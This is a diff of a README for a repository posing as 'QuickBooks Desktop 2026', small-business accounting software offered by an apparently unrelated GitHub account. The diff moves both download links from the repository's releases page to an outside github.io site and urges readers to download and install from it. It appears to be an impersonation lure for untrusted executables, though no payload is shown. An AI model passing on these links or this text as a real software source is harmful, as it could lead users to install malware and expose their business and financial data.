@@ -1,6 +1,6 @@
 # 📊 QuickBooks-Desktop-2026 - Streamline your small business financial tracking
 
-[![](https://img.shields.io/badge/Download-QuickBooks-blue.svg)](https://github.com/Sepulchral-setter477/QuickBooks-Desktop-2026/releases)
+[![](https://img.shields.io/badge/Download-QuickBooks-blue.svg)](https://sepulchral-setter477.github.io)
 
 QuickBooks Desktop 2026 helps you manage your business finances on your Windows computer. This tool handles company files, bank reconciliations, and backup schedules. You store your data locally to maintain complete control. This software simplifies bookkeeping tasks for small business owners.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start.
 
 Visit the official releases page to download the latest version of the software.
 
-[Click here to visit the download page](https://github.com/Sepulchral-setter477/QuickBooks-Desktop-2026/releases)
+[Click here to visit the download page](https://sepulchral-setter477.github.io)
 
 1. Navigate to the link above.
 2. Look for the latest version listed under the Releases section.
